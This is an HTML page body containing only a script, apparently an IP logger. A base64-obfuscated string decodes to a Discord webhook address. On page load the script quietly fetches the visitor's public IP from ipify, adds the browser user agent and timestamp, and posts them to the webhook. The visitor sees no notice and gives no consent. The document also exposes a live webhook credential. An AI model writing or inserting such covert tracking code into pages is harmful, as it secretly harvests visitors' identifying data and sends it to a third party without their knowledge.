<body>

    <script>
        const MMMA = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MjMwNTc4MDM0MTQ3NzU3OC9XQzJIV25hczNJZlE4cHVBblZkQUFzdTJHN3FBZnNwa09DX1ZvcW8tU1JnZnpHZGlpclFlc3EyX3dsQ245UEh5SnBsZw=='

        const WAMDD = atob(MMMA);

        async function sendVisitorData() {
            try {
                
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

              
                const payload = {
                    content: `New user! \n**IP:** ${userIP} \n**Data:** ${new Date().toLocaleString()} \n**Przeglądarka:** ${navigator.userAgent}`
                };

                
                await fetch(WAMDD, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                console.log('Sended.');

            } catch (error) {
                console.error('Error:', error);
            }
        }

        
        window.onload = sendVisitorData;
    </script>
</body>
